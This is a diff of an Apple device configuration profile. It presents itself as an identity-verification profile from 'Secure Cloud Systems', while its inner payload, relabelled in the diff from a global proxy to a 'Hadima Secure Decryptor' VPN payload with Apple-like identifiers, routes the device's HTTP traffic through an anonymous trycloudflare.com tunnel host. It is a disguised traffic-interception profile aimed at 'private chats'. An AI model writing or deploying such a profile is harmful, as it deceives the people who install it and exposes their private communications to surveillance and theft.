@@ -2,40 +2,47 @@
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>PayloadContent</key>
-    <array>
-        <dict>
-            <key>PayloadDescription</key>
-            <string>Configures secure data decryption gateway.</string>
-            <key>PayloadDisplayName</key>
-            <string>Data Decryptor</string>
-            <key>PayloadIdentifier</key>
-            <string>com.apple.proxy.http.global.1</string>
-            <key>PayloadType</key>
-            <string>com.apple.proxy.http.global</string>
-            <key>PayloadUUID</key>
-            <string>B1C2D3E4-F5A6-4B5B-8C9D-E1F2A3B4C5D6</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>ProxyType</key>
-            <string>Auto</string>
-            <key>ProxyPACURL</key>
-            <string>http://bb8e7d52-15c4-495b-9468-91c04224bd1a.trycloudflare.com/proxy.pac</string>
-        </dict>
-    </array>
-    <key>PayloadDescription</key>
-    <string>Identity Verification for Private Storage Access</string>
-    <key>PayloadDisplayName</key>
-    <string>Verification System</string>
-    <key>PayloadIdentifier</key>
-    <string>com.verification.system</string>
-    <key>PayloadOrganization</key>
-    <string>Secure Cloud Systems</string>
-    <key>PayloadType</key>
-    <string>Configuration</string>
-    <key>PayloadUUID</key>
-    <string>C1B2A3D4-E5F6-4A5B-8C9D-E0F1A2B3C4D5</string>
-    <key>PayloadVersion</key>
+	<key>PayloadContent</key>
+	<array>
+		<dict>
+			<key>PayloadDescription</key>
+			<string>Configures secure data decryption gateway for private chats.</string>
+			<key>PayloadDisplayName</key>
+			<string>Hadima Secure Decryptor</string>
+			<key>PayloadIdentifier</key>
+			<string>com.apple.vpn.managed.1</string>
+			<key>PayloadType</key>
+			<string>com.apple.vpn.managed</string>
+			<key>PayloadUUID</key>
+			<string>E4A1B2C3-D4E5-F6A1-B2C3-D4E5F6A1B2C3</string>
+			<key>PayloadVersion</key>
+			<integer>1</integer>
+			<key>Proxies</key>
+			<dict>
+				<key>HTTPEnable</key>
+				<integer>1</integer>
+				<key>HTTPProxy</key>
+				<string>bb8e7d52-15c4-495b-9468-91c04224bd1a.trycloudflare.com</string>
+				<key>HTTPPort</key>
+				<integer>80</integer>
+			</dict>
+			<key>VPNType</key>
+			<string>IKEv2</string>
+		</dict>
+	</array>
+	<key>PayloadDescription</key>
+	<string>Identity Verification for Private Storage Access</string>
+	<key>PayloadDisplayName</key>
+	<string>Verification System</string>
+	<key>PayloadIdentifier</key>
+	<string>com.verification.system</string>
+	<key>PayloadOrganization</key>
+	<string>Secure Cloud Systems</string>
+	<key>PayloadType</key>
+	<string>Configuration</string>
+	<key>PayloadUUID</key>
+	<string>C1B2A3D4-E5F6-4A5B-8C9D-E0F1A2B3C4D5</string>
+	<key>PayloadVersion</key>
     <integer>1</integer>
 </dict>
 </plist>
